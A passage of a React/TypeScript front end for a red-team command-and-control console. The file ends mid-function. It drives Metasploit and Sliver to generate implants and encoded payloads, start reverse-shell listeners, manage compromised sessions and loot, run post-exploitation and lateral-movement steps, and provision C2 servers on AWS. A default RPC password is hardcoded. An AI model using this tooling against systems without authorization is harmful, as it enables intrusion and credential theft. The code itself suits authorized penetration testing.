import { useState, useEffect, useRef } from 'react'
import Icon from '@/components/Icon'
import Terminal, { TerminalHandle } from '../components/Terminal'
import { getApiBase, wsUrl } from '@/lib/config'
import { useAppStore } from '@/stores/appStore'

// ── Types ──────────────────────────────────────────────────────────

interface MsfStatus {
  connected: boolean
  version?: string
  sessions?: number
  jobs?: number
}

interface LateralTechnique {
  id: string
  label: string
  description: string
  msf_module: string | null
  ports: number[]
}

interface LateralDiscoveryResult {
  remote_host: string
  platform: string
  is_domain: boolean
  subnets: string[]
  cred_types_available: string[]
  techniques: LateralTechnique[]
  discovery_modules: { name: string; description: string }[]
}

interface SysinfoData {
  hostname: string | null
  os: string | null
  arch: string | null
  username: string | null
  domain: string | null
  is_admin: boolean | null
  local_time: string | null
}

interface C2Session {
  id: string
  msf_session_id?: string
  session_type: string
  platform: string
  arch: string
  remote_host: string
  remote_port: string
  tunnel_peer: string
  via_exploit: string
  via_payload: string
  status: 'active' | 'inactive' | 'lost'
  notes: string
  established_at: string
  last_seen: string
  loot_count: number
  task_count: number
  live: boolean
  sysinfo: SysinfoData | null
}

interface LootEntry {
  id: string
  session_id: string
  loot_type: string
  title: string
  content: string
  source_path: string
  captured_at: string
}

interface PayloadDef {
  value: string
  label: string
  platform: string
  arch: string
  formats: string[]
}

interface Listener {
  job_id: string
  name: string
  started_at: string
  datastore: Record<string, string>
}

interface PostModule {
  name: string
  label: string
  description: string
}

const rule = '1px solid var(--rule)'
const ruleStrong = '1px solid var(--rule-strong)'

// ── Status badge ───────────────────────────────────────────────────

function SessionStatusBadge({ status, live }: { status: string; live: boolean }) {
  if (status === 'active' && live) {
    return (
      <span style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, fontWeight: 600, color: 'var(--ok)' }}>
        <span style={{ position: 'relative', display: 'flex', width: 8, height: 8 }}>
          <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: 'var(--ok)', opacity: 0.75 }} />
          <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--ok)' }} />
        </span>
        ACTIVE
      </span>
    )
  }
  if (status === 'lost') {
    return (
      <span style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, fontWeight: 600, color: 'var(--crit)' }}>
        <span style={{ position: 'relative', display: 'flex', width: 8, height: 8 }}>
          <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: 'var(--crit)', opacity: 0.75 }} />
          <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--crit)' }} />
        </span>
        LOST
      </span>
    )
  }
  return (
    <span style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, fontWeight: 600, color: 'var(--fg-3)' }}>
      <span style={{ display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--fg-4)' }} />
      INACTIVE
    </span>
  )
}

// ── Sliver Panel ───────────────────────────────────────────────────

interface SliverStatus { available: boolean; connected: boolean; version: string | null }
interface SliverListener { job_id: string; name: string; protocol: string; port: number }
interface SliverSession { sliver_id: string; session_type: string; platform: string; arch: string; remote_host: string; hostname: string; username: string; is_privileged: boolean; status: string }
interface SliverGenerateForm { os_target: string; arch: string; lhost: string; lport: string; protocol: string; format: string }

function SliverPanel() {
  const [status, setStatus] = useState<SliverStatus | null>(null)
  const [sessions, setSessions] = useState<SliverSession[]>([])
  const [listeners, setListeners] = useState<SliverListener[]>([])
  const [loading, setLoading] = useState(false)
  const [genForm, setGenForm] = useState<SliverGenerateForm>({ os_target: 'linux', arch: 'amd64', lhost: '', lport: '443', protocol: 'mtls', format: 'exe' })
  const [generating, setGenerating] = useState(false)
  const [genResult, setGenResult] = useState('')
  const [lhostIn, setLhostIn] = useState('')
  const [lportIn, setLportIn] = useState('443')
  const [protoIn, setProtoIn] = useState('mtls')
  const [startingListener, setStartingListener] = useState(false)

  const inputCls: React.CSSProperties = { border: ruleStrong, borderRadius: 4, padding: '6px 8px', fontSize: 11, outline: 'none', width: '100%', background: 'var(--bg)', color: 'var(--fg)', fontFamily: 'var(--font-sans)' }

  useEffect(() => {
    fetch(`${getApiBase()}/c2/sliver/status`).then(r => r.ok ? r.json() : null).then(d => d && setStatus(d))
  }, [])

  async function refresh() {
    setLoading(true)
    try {
      const [sesRes, lstRes] = await Promise.all([
        fetch(`${getApiBase()}/c2/sliver/sessions`),
        fetch(`${getApiBase()}/c2/sliver/listeners`),
      ])
      if (sesRes.ok) setSessions(await sesRes.json())
      if (lstRes.ok) setListeners(await lstRes.json())
    } finally {
      setLoading(false)
    }
  }

  async function startListener() {
    if (!lhostIn) return
    setStartingListener(true)
    try {
      await fetch(`${getApiBase()}/c2/sliver/listeners`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ protocol: protoIn, lhost: lhostIn, lport: parseInt(lportIn) || 443 }),
      })
      await refresh()
    } finally {
      setStartingListener(false)
    }
  }

  async function stopListener(jobId: string) {
    await fetch(`${getApiBase()}/c2/sliver/listeners/${jobId}`, { method: 'DELETE' })
    await refresh()
  }

  async function generateImplant() {
    setGenerating(true)
    setGenResult('')
    try {
      const res = await fetch(`${getApiBase()}/c2/sliver/generate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...genForm, lport: parseInt(genForm.lport) || 443 }),
      })
      const data = await res.json()
      if (!res.ok) setGenResult('Error: ' + (data.detail || JSON.stringify(data)))
      else setGenResult(data.output || `Generated → ${data.output_path}`)
    } finally {
      setGenerating(false)
    }
  }

  const sliverBorder = '1px solid rgba(167,139,250,0.2)'
  const sliverSub = '1px solid rgba(167,139,250,0.1)'
  return (
    <div style={{ background: 'var(--bg-2)', border: sliverBorder, borderRadius: 4, overflow: 'hidden' }}>
      <div style={{ padding: '10px 16px', borderBottom: sliverBorder, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', display: 'flex', alignItems: 'center', gap: 8 }}>
          <Icon name="target" size={13} style={{ color: '#a78bfa' }} /> Sliver C2
          {status?.available && status.connected && (
            <span style={{ fontSize: 10, fontWeight: 400, color: '#a78bfa', background: 'rgba(167,139,250,0.15)', padding: '1px 6px', borderRadius: 4 }}>{status.version}</span>
          )}
        </span>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          {status !== null && (
            <span style={{ fontSize: 10, fontWeight: 600, color: status.connected ? 'var(--ok)' : status.available ? 'var(--accent)' : 'var(--fg-4)' }}>
              {status.connected ? 'CONNECTED' : status.available ? 'NOT CONNECTED' : 'NOT INSTALLED'}
            </span>
          )}
          <button onClick={refresh} disabled={loading} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0 }}>
            <Icon name="refresh" size={12} className={loading ? 'animate-spin' : ''} />
          </button>
        </div>
      </div>

      {!status?.available ? (
        <div style={{ padding: '24px 16px', textAlign: 'center', fontSize: 11, color: 'var(--fg-4)', display: 'flex', flexDirection: 'column', gap: 4 }}>
          <p>Sliver is not installed or not configured.</p>
          <p style={{ color: 'var(--fg-4)' }}>Set <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--fg-3)' }}>SLIVER_CONFIG</span> env var to your operator config path.</p>
        </div>
      ) : (
        <div style={{ padding: 12, display: 'flex', flexDirection: 'column', gap: 12 }}>
          {/* Listeners */}
          <div>
            <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 6 }}>Listeners</div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr auto', gap: 8, alignItems: 'end', marginBottom: 8 }}>
              <select value={protoIn} onChange={e => setProtoIn(e.target.value)} style={inputCls}>
                {['mtls','https','http','dns','wg'].map(p => <option key={p} value={p}>{p}</option>)}
              </select>
              <input value={lhostIn} onChange={e => setLhostIn(e.target.value)} placeholder="LHOST" style={inputCls} />
              <input value={lportIn} onChange={e => setLportIn(e.target.value)} placeholder="Port" style={inputCls} />
              <button onClick={startListener} disabled={startingListener || !lhostIn} style={{ padding: '6px 10px', borderRadius: 4, background: 'rgba(167,139,250,0.15)', border: '1px solid rgba(167,139,250,0.3)', fontSize: 11, color: '#a78bfa', cursor: (startingListener || !lhostIn) ? 'not-allowed' : 'pointer', opacity: (startingListener || !lhostIn) ? 0.4 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 4 }}>
                {startingListener ? <Icon name="refresh" size={10} className="animate-spin" /> : <Icon name="play" size={10} />} Start
              </button>
            </div>
            {listeners.length === 0 ? (
              <p style={{ fontSize: 10, color: 'var(--fg-4)', fontStyle: 'italic' }}>No active Sliver listeners</p>
            ) : listeners.map(l => (
              <div key={l.job_id} style={{ display: 'flex', alignItems: 'center', gap: 12, fontSize: 11, padding: '6px 0', borderBottom: sliverSub }}>
                <span style={{ position: 'relative', display: 'flex', width: 6, height: 6, flexShrink: 0 }}>
                  <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: '#a78bfa', opacity: 0.75 }} />
                  <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 6, height: 6, background: '#a78bfa' }} />
                </span>
                <span style={{ flex: 1, fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--fg-2)' }}>{l.protocol}:{l.port}</span>
                <span style={{ color: 'var(--fg-3)', fontSize: 10 }}>#{l.job_id}</span>
                <button onClick={() => stopListener(l.job_id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }}><Icon name="x" size={11} /></button>
              </div>
            ))}
          </div>

          {/* Sessions */}
          {sessions.length > 0 && (
            <div>
              <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 6 }}>Active Implants</div>
              {sessions.map(s => (
                <div key={s.sliver_id} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '6px 0', borderBottom: sliverSub, fontSize: 11 }}>
                  <span style={{ width: 6, height: 6, borderRadius: '50%', flexShrink: 0, background: s.status === 'active' ? 'var(--ok)' : 'var(--fg-4)' }} />
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--fg-2)', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.hostname || s.remote_host}</span>
                  <span style={{ fontSize: 10, color: 'var(--fg-3)' }}>{s.platform}/{s.arch}</span>
                  {s.is_privileged && <span style={{ fontSize: 9, color: '#fbbf24', background: 'rgba(251,191,36,0.1)', padding: '0 4px', borderRadius: 3 }}>PRIV</span>}
                </div>
              ))}
            </div>
          )}

          {/* Generate Implant */}
          <div style={{ borderTop: sliverBorder, paddingTop: 12 }}>
            <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Generate Implant</div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 8 }}>
              <div>
                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>OS</label>
                <select value={genForm.os_target} onChange={e => setGenForm(f => ({...f, os_target: e.target.value}))} style={inputCls}>
                  {['linux','windows','darwin'].map(o => <option key={o} value={o}>{o}</option>)}
                </select>
              </div>
              <div>
                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>Arch</label>
                <select value={genForm.arch} onChange={e => setGenForm(f => ({...f, arch: e.target.value}))} style={inputCls}>
                  {['amd64','arm64','386'].map(a => <option key={a} value={a}>{a}</option>)}
                </select>
              </div>
              <div>
                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>C2 Protocol</label>
                <select value={genForm.protocol} onChange={e => setGenForm(f => ({...f, protocol: e.target.value}))} style={inputCls}>
                  {['mtls','https','http','dns'].map(p => <option key={p} value={p}>{p}</option>)}
                </select>
              </div>
              <div>
                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>Format</label>
                <select value={genForm.format} onChange={e => setGenForm(f => ({...f, format: e.target.value}))} style={inputCls}>
                  {['exe','shared','shellcode','service'].map(f => <option key={f} value={f}>{f}</option>)}
                </select>
              </div>
              <div>
                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>LHOST</label>
                <input value={genForm.lhost} onChange={e => setGenForm(f => ({...f, lhost: e.target.value}))} placeholder="C2 host" style={inputCls} />
              </div>
              <div>
                <label style={{ fontSize: 10, color: 'var(--fg-4)', display: 'block', marginBottom: 2 }}>LPORT</label>
                <input value={genForm.lport} onChange={e => setGenForm(f => ({...f, lport: e.target.value}))} placeholder="443" style={inputCls} />
              </div>
            </div>
            <button
              onClick={generateImplant}
              disabled={generating || !genForm.lhost}
              style={{ width: '100%', padding: '6px 0', borderRadius: 4, background: 'rgba(167,139,250,0.15)', border: '1px solid rgba(167,139,250,0.3)', fontSize: 11, color: '#a78bfa', cursor: (generating || !genForm.lhost) ? 'not-allowed' : 'pointer', opacity: (generating || !genForm.lhost) ? 0.4 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}
            >
              {generating ? <Icon name="refresh" size={11} className="animate-spin" /> : <Icon name="layers" size={11} />}
              Generate
            </button>
            {genResult && (
              <pre style={{ marginTop: 8, background: 'var(--bg)', borderRadius: 4, padding: '8px', fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', whiteSpace: 'pre-wrap', maxHeight: 96, overflowY: 'auto', border: sliverBorder }}>{genResult}</pre>
            )}
          </div>
        </div>
      )}
    </div>
  )
}

// ── Main component ─────────────────────────────────────────────────

export default function C2Console() {
  const [activeTab, setActiveTab] = useState<'sessions' | 'payloads' | 'listeners' | 'attack' | 'loot' | 'postex' | 'lotl' | 'infra'>('sessions')
  const { selectedProject: sp } = useAppStore()
  const projectId = sp?.id ?? ''
  const [msfStatus, setMsfStatus] = useState<MsfStatus>({ connected: false })
  const [sessions, setSessions] = useState<C2Session[]>([])
  const [activeSession, setActiveSession] = useState<C2Session | null>(null)
  const [loot, setLoot] = useState<LootEntry[]>([])
  const [payloads, setPayloads] = useState<PayloadDef[]>([])
  const [listeners, setListeners] = useState<Listener[]>([])
  const [postModules, setPostModules] = useState<PostModule[]>([])
  const [postHistory, setPostHistory] = useState<Array<{id: string; label: string; ts: Date; output: string | null; error: string | null; running: boolean}>>([])
  const [expandedHistory, setExpandedHistory] = useState<Set<string>>(new Set())
  const [loading, setLoading] = useState(false)
  const [copied, setCopied] = useState('')
  const [showLootContent, setShowLootContent] = useState<string | null>(null)

  // LOTL state
  interface LotlCommand { id: string; platform: string; label: string; cmd: string; mitre: string; notes: string }
  interface LotlCategory { id: string; label: string; platforms: string[]; commands: LotlCommand[] }
  const [lotlLib, setLotlLib] = useState<LotlCategory[]>([])
  const [lotlFilter, setLotlFilter] = useState<'all' | 'linux' | 'windows'>('all')
  const [lotlSearch, setLotlSearch] = useState('')
  const [lotlCopied, setLotlCopied] = useState('')

  // Post-ex state
  interface ChecklistItem { id: string; category: string; label: string; done: boolean; done_at: string | null }
  interface PivotRoute { id: string; subnet: string; netmask: string; session_id: string; added_at: string; msf_result: string }
  const [checklist, setChecklist] = useState<ChecklistItem[]>([])
  const [pivotRoutes, setPivotRoutes] = useState<PivotRoute[]>([])
  const [harvestOutput, setHarvestOutput] = useState('')
  const [harvesting, setHarvesting] = useState(false)
  const [upgrading, setUpgrading] = useState(false)
  const [upgradeOutput, setUpgradeOutput] = useState('')
  const [screenshotting, setScreenshotting] = useState(false)
  const [screenshotResult, setScreenshotResult] = useState('')
  const [probing, setProbing] = useState(false)
  const [probeOutput, setProbeOutput] = useState('')
  const [sysinfoRaw, setSysinfoRaw] = useState('')
  const [parsingSysinfo, setParsingSysinfo] = useState(false)
  const [newRouteSubnet, setNewRouteSubnet] = useState('')
  const [newRouteNetmask, setNewRouteNetmask] = useState('255.255.255.0')
  const [addingRoute, setAddingRoute] = useState(false)
  const [lateralResult, setLateralResult] = useState<LateralDiscoveryResult | null>(null)
  const [discoveringLateral, setDiscoveringLateral] = useState(false)
  const terminalRef = useRef<TerminalHandle>(null)
  const wsRef = useRef<WebSocket | null>(null)
  const inputRef = useRef<HTMLInputElement>(null)
  const sessionPollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // MSF connect form
  const [msfHost, setMsfHost] = useState('127.0.0.1')
  const [msfPort, setMsfPort] = useState('55553')
  const [msfPass, setMsfPass] = useState('seraph')
  const [connecting, setConnecting] = useState(false)
  const [connectError, setConnectError] = useState('')

  // Payload builder form
  const [selPayload, setSelPayload] = useState('')
  const [lhost, setLhost] = useState('')
  const [lport, setLport] = useState('4444')
  const [payloadFmt, setPayloadFmt] = useState('elf')
  const [payloadEncoder, setPayloadEncoder] = useState('none')
  const [payloadIterations, setPayloadIterations] = useState('1')
  const [payloadBadChars, setPayloadBadChars] = useState('')
  const [generatingPayload, setGeneratingPayload] = useState(false)
  const [autoStartListener, setAutoStartListener] = useState(false)

  // Listener form
  const [listenerPayload, setListenerPayload] = useState('linux/x64/meterpreter/reverse_tcp')
  const [listenerLhost, setListenerLhost] = useState('0.0.0.0')
  const [listenerLport, setListenerLport] = useState('4444')
  const [startingListener, setStartingListener] = useState(false)

  // Module run state per card index
  const [runningModule, setRunningModule] = useState<number | null>(null)
  const [moduleResults, setModuleResults] = useState<Record<number, ModuleRunResult>>({})

  // Attack plan
  interface AttackRec {
    module: string
    payload: string
    options: Record<string, string>
    description: string
    confidence: 'high' | 'medium' | 'low'
    match_reason: string
    finding_title: string
    finding_severity: string
    post_modules: string[]
  }
  interface ModuleRunResult {
    error?: string
    job_id?: string | null
    new_session_id?: string | null
    msf_result?: Record<string, unknown>
    timed_out?: boolean
  }
  interface AttackPlanResult {
    recommendations: AttackRec[]
    unmatched_findings: { title: string; severity: string; cve_id: string | null }[]
    target_count: number
    finding_count: number
    matched_count: number
  }
  const [attackPlan, setAttackPlan] = useState<AttackPlanResult | null>(null)
  const [attackPlanError, setAttackPlanError] = useState('')
  const [generatingAttack, setGeneratingAttack] = useState(false)

  // Infrastructure tab state
  interface C2Node { id: string; name: string; c2_type: string; host: string; port: number; ssl: boolean; status: string; source: string; last_checked: string | null; notes: string }
  interface CloudC2Instance { id: string; name: string; provider: string; instance_id: string; region: string; public_ip: string | null; status: string; c2_type: string; instance_type: string; node_id: string | null; error_msg: string | null; created_at: string }
  const [c2Nodes, setC2Nodes] = useState<C2Node[]>([])
  const [loadingNodes, setLoadingNodes] = useState(false)
  const [addNodeOpen, setAddNodeOpen] = useState(false)
  const [nodeFormName, setNodeFormName] = useState('')
  const [nodeFormType, setNodeFormType] = useState<'msf' | 'sliver'>('msf')
  const [nodeFormHost, setNodeFormHost] = useState('')
  const [nodeFormPort, setNodeFormPort] = useState('55553')
  const [nodeFormPass, setNodeFormPass] = useState('')
  const [nodeFormSsl, setNodeFormSsl] = useState(false)
  const [nodeFormNotes, setNodeFormNotes] = useState('')
  const [savingNode, setSavingNode] = useState(false)
  const [nodeError, setNodeError] = useState('')
  const [connectingNodeId, setConnectingNodeId] = useState<string | null>(null)
  const [checkingNodeId, setCheckingNodeId] = useState<string | null>(null)
  const [activeNodeId, setActiveNodeId] = useState<string | null>(null)
  const [cloudInstances, setCloudInstances] = useState<CloudC2Instance[]>([])
  const [cloudSettingsOpen, setCloudSettingsOpen] = useState(false)
  const [awsAccessKey, setAwsAccessKey] = useState('')
  const [awsSecretKey, setAwsSecretKey] = useState('')
  const [awsRegion, setAwsRegion] = useState('us-east-1')
  const [savingCloudCreds, setSavingCloudCreds] = useState(false)
  const [cloudStatus, setCloudStatus] = useState<{ configured: boolean; valid?: boolean; account_id?: string; error?: string } | null>(null)
  const [launchFormOpen, setLaunchFormOpen] = useState(false)
  const [launchName, setLaunchName] = useState('')
  const [launchRegion, setLaunchRegion] = useState('us-east-1')
  const [launchC2Type, setLaunchC2Type] = useState<'msf' | 'sliver'>('msf')
  const [launchInstanceType, setLaunchInstanceType] = useState('t3.medium')
  const [launchingInstance, setLaunchingInstance] = useState(false)
  const [provisionInstanceId, setProvisionInstanceId] = useState<string | null>(null)
  const [provisionLog, setProvisionLog] = useState<string[]>([])
  const provisionWsRef = useRef<WebSocket | null>(null)
  const provisionLogRef = useRef<HTMLDivElement>(null)

  // Terminal input
  const [termInput, setTermInput] = useState('')

  useEffect(() => {
    checkStatus()
    loadPayloads()
  }, [])

  useEffect(() => {
    if (!projectId) return
    loadSessions()
    loadLoot()
    // Auto-sync: poll sessions every 30 s to pick up backend-synced sessions
    const autoSyncTimer = setInterval(loadSessions, 30_000)
    return () => clearInterval(autoSyncTimer)
  }, [projectId])

  useEffect(() => {
    if (msfStatus.connected) {
      loadListeners()
    }
  }, [msfStatus.connected])

  useEffect(() => {
    if (activeSession) {
      loadPostModules(activeSession.platform)
      connectTerminal(activeSession)
      setPostHistory([])
      setExpandedHistory(new Set())
      loadChecklist(activeSession.id)
      loadRoutes(activeSession.id)
      setHarvestOutput('')
      setUpgradeOutput('')
      setScreenshotResult('')
      setProbeOutput('')
    }
    return () => { wsRef.current?.close() }
  }, [activeSession?.id])

  useEffect(() => {
    if (activeTab === 'listeners') loadListeners()
    if (activeTab === 'lotl') loadLotl()
    if (activeTab === 'infra') {
      loadC2Nodes(); loadCloudInstances()
      fetch(`${getApiBase()}/cloud/aws/status`).then(r => r.ok ? r.json() : null).then(d => { if (d) setCloudStatus(d) }).catch(() => {})
    }
  }, [activeTab])

  async function checkStatus() {
    const res = await fetch(`${getApiBase()}/c2/status`)
    if (res.ok) setMsfStatus(await res.json())
  }

  async function loadPayloads() {
    const res = await fetch(`${getApiBase()}/c2/payloads`)
    if (res.ok) setPayloads(await res.json())
  }

  async function loadLotl() {
    if (lotlLib.length > 0) return
    const res = await fetch(`${getApiBase()}/c2/lotl`)
    if (res.ok) {
      const data = await res.json()
      setLotlLib(data.categories || [])
    }
  }

  async function loadC2Nodes() {
    setLoadingNodes(true)
    try {
      const [nodesRes, activeRes] = await Promise.all([
        fetch(`${getApiBase()}/c2/nodes`),
        fetch(`${getApiBase()}/c2/nodes/active`),
      ])
      if (nodesRes.ok) setC2Nodes(await nodesRes.json())
      if (activeRes.ok) { const d = await activeRes.json(); setActiveNodeId(d.active_node_id ?? null) }
    } finally { setLoadingNodes(false) }
  }

  async function loadCloudInstances() {
    const res = await fetch(`${getApiBase()}/cloud/instances`)
    if (res.ok) setCloudInstances(await res.json())
  }

  async function handleAddNode() {
    if (!nodeFormName || !nodeFormHost) { setNodeError('Name and host are required.'); return }
    setSavingNode(true); setNodeError('')
    try {
      const res = await fetch(`${getApiBase()}/c2/nodes`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: nodeFormName, c2_type: nodeFormType, host: nodeFormHost, port: parseInt(nodeFormPort) || 55553, password: nodeFormPass, ssl: nodeFormSsl, notes: nodeFormNotes }),
      })
      if (!res.ok) { const d = await res.json(); setNodeError(d.detail ?? 'Failed to save node'); return }
      await loadC2Nodes()
      setAddNodeOpen(false)
      setNodeFormName(''); setNodeFormHost(''); setNodeFormPass(''); setNodeFormNotes('')
    } finally { setSavingNode(false) }
  }

  async function handleDeleteNode(id: string) {
    await fetch(`${getApiBase()}/c2/nodes/${id}`, { method: 'DELETE' })
    await loadC2Nodes()
  }

  async function handleConnectNode(id: string) {
    setConnectingNodeId(id)
    try {
      const res = await fetch(`${getApiBase()}/c2/nodes/${id}/connect`, { method: 'POST' })
      if (res.ok) { setActiveNodeId(id); await checkStatus() }
    } finally { setConnectingNodeId(null) }
  }

  async function handleCheckNode(id: string) {
    setCheckingNodeId(id)
    try {
      await fetch(`${getApiBase()}/c2/nodes/${id}/check`, { method: 'POST' })
      await loadC2Nodes()
    } finally { setCheckingNodeId(null) }
  }

  async function handleSaveCloudCreds() {
    setSavingCloudCreds(true)
    try {
      const res = await fetch(`${getApiBase()}/cloud/aws/credentials`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_key: awsAccessKey, secret_key: awsSecretKey, region: awsRegion }),
      })
      if (res.ok) {
        const statusRes = await fetch(`${getApiBase()}/cloud/aws/status`)
        if (statusRes.ok) setCloudStatus(await statusRes.json())
      }
    } finally { setSavingCloudCreds(false) }
  }

  async function handleLaunchEC2() {
    if (!launchName) return
    setLaunchingInstance(true); setProvisionLog([])
    try {
      const res = await fetch(`${getApiBase()}/cloud/instances`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: launchName, c2_type: launchC2Type, region: launchRegion, instance_type: launchInstanceType }),
      })
      if (!res.ok) { const d = await res.json(); setProvisionLog([`Error: ${d.detail ?? 'Launch failed'}`]); return }
      const { instance_db_id } = await res.json()
      setProvisionInstanceId(instance_db_id)
      setLaunchFormOpen(false)
      const ws = new WebSocket(wsUrl(`/ws/cloud/provision/${instance_db_id}`))
      provisionWsRef.current = ws
      ws.onmessage = e => {
        try {
          const msg = JSON.parse(e.data)
          if (msg.type === 'stdout' || msg.type === 'log') {
            setProvisionLog(p => [...p, msg.data])
            setTimeout(() => { provisionLogRef.current?.scrollTo(0, provisionLogRef.current.scrollHeight) }, 50)
          }
          if (msg.type === 'done' || msg.type === 'exit') {
            loadCloudInstances(); loadC2Nodes()
          }
        } catch { setProvisionLog(p => [...p, e.data]) }
      }
      ws.onerror = () => setProvisionLog(p => [...p, '[WebSocket error]'])
      ws.onclose = () => { provisionWsRef.current = null; loadCloudInstances(); loadC2Nodes() }
    } finally { setLaunchingInstance(false) }
  }

  async function loadSessions() {
    if (!projectId) return
    const res = await fetch(`${getApiBase()}/c2/sessions?project_id=${projectId}`)
    if (res.ok) setSessions(await res.json())
  }

  async function loadLoot() {
    if (!projectId) return
    const res = await fetch(`${getApiBase()}/c2/loot?project_id=${projectId}`)
    if (res.ok) setLoot(await res.json())
  }

  async function loadListeners() {
    const res = await fetch(`${getApiBase()}/c2/listeners`)
    if (res.ok) setListeners(await res.json())
  }

  async function loadPostModules(platform: string) {
    const p = platform.toLowerCase().includes('win') ? 'windows' : platform.toLowerCase().includes('linux') ? 'linux' : 'multi'
    const res = await fetch(`${getApiBase()}/c2/post-modules?platform=${p}`)
    if (res.ok) setPostModules(await res.json())
  }

  async function handleConnect() {
    setConnecting(true)
    setConnectError('')
    try {
      const res = await fetch(`${getApiBase()}/c2/connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ host: msfHost, port: parseInt(msfPort), password: msfPass, ssl: false }),
      })
      if (!res.ok) {
        const err = await res.json()
        setConnectError(err.detail || 'Connection failed')
      } else {
        setMsfStatus(await res.json())
        loadListeners()
      }
    } catch (e: unknown) {
      setConnectError(e instanceof Error ? e.message : 'Connection failed')
    } finally {
      setConnecting(false)
    }
  }

  async function handleSync() {
    if (!projectId) return
    setLoading(true)
    try {
      await fetch(`${getApiBase()}/c2/sessions/sync?project_id=${projectId}`, { method: 'POST' })
      await loadSessions()
    } finally {
      setLoading(false)
    }
  }

  async function handleKillSession(session: C2Session) {
    await fetch(`${getApiBase()}/c2/sessions/${session.id}?kill=true`, { method: 'DELETE' })
    if (activeSession?.id === session.id) setActiveSession(null)
    loadSessions()
  }

  async function handleGeneratePayload() {
    if (!selPayload || !lhost || !lport) return
    setGeneratingPayload(true)
    try {
      const payload = payloads.find(p => p.value === selPayload)
      const res = await fetch(`${getApiBase()}/c2/payloads/generate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload: selPayload,
          lhost,
          lport: parseInt(lport),
          format: payloadFmt,
          arch: payload?.arch === 'x64' ? 'x86_64' : payload?.arch || 'x86_64',
          platform: payload?.platform || 'linux',
          encoder: payloadEncoder,
          iterations: parseInt(payloadIterations) || 1,
          bad_chars: payloadBadChars,
          auto_start_listener: autoStartListener,
        }),
      })
      if (!res.ok) {
        const err = await res.json()
        alert(err.detail || 'Payload generation failed')
        return
      }
      const blob = await res.blob()
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      const cd = res.headers.get('Content-Disposition') || ''
      const match = cd.match(/filename="(.+)"/)
      a.download = match?.[1] || 'payload.bin'
      a.click()
      URL.revokeObjectURL(url)

      if (autoStartListener) {
        // Listener was auto-started server-side via auto_start_listener flag
        await loadListeners()
        setActiveTab('listeners')
      }
    } finally {
      setGeneratingPayload(false)
    }
  }

  async function handleStartListener() {
    setStartingListener(true)
    try {
      const res = await fetch(`${getApiBase()}/c2/listeners/start`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: listenerPayload, lhost: listenerLhost, lport: parseInt(listenerLport) }),
      })
      if (!res.ok) {
        const err = await res.json()
        alert(err.detail || 'Failed to start listener')
      } else {
        await loadListeners()
      }
    } finally {
      setStartingListener(false)
    }
  }

  async function handleStopListener(jobId: string) {
    await fetch(`${getApiBase()}/c2/listeners/${jobId}`, { method: 'DELETE' })
    loadListeners()
  }

  async function handleGenerateAttackPlan() {
    if (!projectId) return
    setGeneratingAttack(true)
    setAttackPlanError('')
    setAttackPlan(null)
    try {
      const res = await fetch(`${getApiBase()}/c2/attack-plan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ project_id: projectId, lhost }),
      })
      const data = await res.json()
